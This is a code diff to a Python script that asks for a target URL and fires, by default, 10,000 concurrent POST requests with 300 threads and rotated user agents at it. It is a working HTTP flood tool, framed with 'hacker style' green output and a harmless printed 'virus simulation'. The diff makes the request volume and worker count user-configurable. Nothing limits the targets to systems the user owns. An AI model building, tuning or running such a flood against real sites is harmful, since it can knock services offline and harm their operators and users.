@@ -3,17 +3,22 @@ import random
 import string
 from concurrent.futures import ThreadPoolExecutor
 import requests
+import sys
+
+# ANSI colors for green hacker style
+GREEN = "\033[92m"
+RESET = "\033[0m"
 
 # -----------------------
-# Config
+# User Input
 # -----------------------
-target_url = input("Enter target URL: ").strip()
-requests_to_send = 10000  # Your original strong setting
-max_workers = 300         # Your original strong setting
-visible_logs = 100        # Your original strong setting
+target_url = input(f"{GREEN}Enter target URL: {RESET}").strip()
+requests_to_send = int(input(f"{GREEN}Enter number of requests: {RESET}").strip() or 10000)
+max_workers = int(input(f"{GREEN}Enter max workers: {RESET}").strip() or 300)
+visible_logs = 100
 
 user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Linux; Android 11; Mobile)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
 ]
@@ -33,43 +38,43 @@ def send_post(i):
             "User-Agent": random.choice(user_agents),
             "Content-Type": "application/json"
         }
-        response = requests.post(target_url, json=fake_payload, headers=headers, timeout=3)
+        response = requests.post(target_url, json=fake_payload, headers=headers, timeout=5)
         if i < visible_logs:
-            print(f"[{i+1}] Status: {response.status_code}")
-    except requests.RequestException:
+            print(f"{GREEN}[{i+1}] Status: {response.status_code}{RESET}")
+    except requests.RequestException as e:
         if i < visible_logs:
-            print(f"[{i+1}] ❌ Request failed")
+            print(f"{GREEN}[{i+1}] ❌ Request failed: {e}{RESET}")
 
 # -----------------------
-# Fake virus simulator
+# Fake virus simulator (safe)
 # -----------------------
 def generate_payload():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=100))
 
 def infect_file(file_path):
-    print(f"[SIMULATION] Infecting file: {file_path}")
+    print(f"{GREEN}[SIMULATION] Infecting file: {file_path}{RESET}")
     payload = generate_payload()
-    print(f"[SIMULATION] Writing fake payload to {file_path} (NOT ACTUALLY WRITTEN)")
+    print(f"{GREEN}[SIMULATION] Writing fake payload to {file_path} (NOT ACTUALLY WRITTEN){RESET}")
 
 def scan_and_infect():
     fake_files = [f"file_{i}.txt" for i in range(5)]
     for f in fake_files:
         infect_file(f)
-        time.sleep(0.2)
+        time.sleep(0.1)
 
 def connect_to_command_center():
-    print("[SIMULATION] Connecting to attacker server... (no real connection)")
+    print(f"{GREEN}[SIMULATION] Connecting to attacker server... (no real connection){RESET}")
 
 # -----------------------
 # Main runner
 # -----------------------
 def main():
-    print("[SIMULATION] Virus started.")
+    print(f"{GREEN}[SIMULATION] Virus started.{RESET}")
     connect_to_command_center()
     scan_and_infect()
-    print("[SIMULATION] Virus finished.")
+    print(f"{GREEN}[SIMULATION] Virus finished.{RESET}")
 
-    print(f"\n🚀 Sending {requests_to_send} requests to {target_url} (only showing first {visible_logs} logs)...")  
+    print(f"\n{GREEN}🚀 Sending {requests_to_send} requests to {target_url} (only showing first {visible_logs} logs)...{RESET}")  
     start = time.time()  
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:  
@@ -77,7 +82,10 @@ def main():
             executor.submit(send_post, i)  
 
     duration = round(time.time() - start, 2)  
-    print(f"\n✅ Done sending {requests_to_send} requests in {duration} seconds.")
+    print(f"\n{GREEN}✅ Done sending {requests_to_send} requests in {duration} seconds.{RESET}")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        sys.exit(f"\n{GREEN}⚠ Stopped by user.{RESET}")
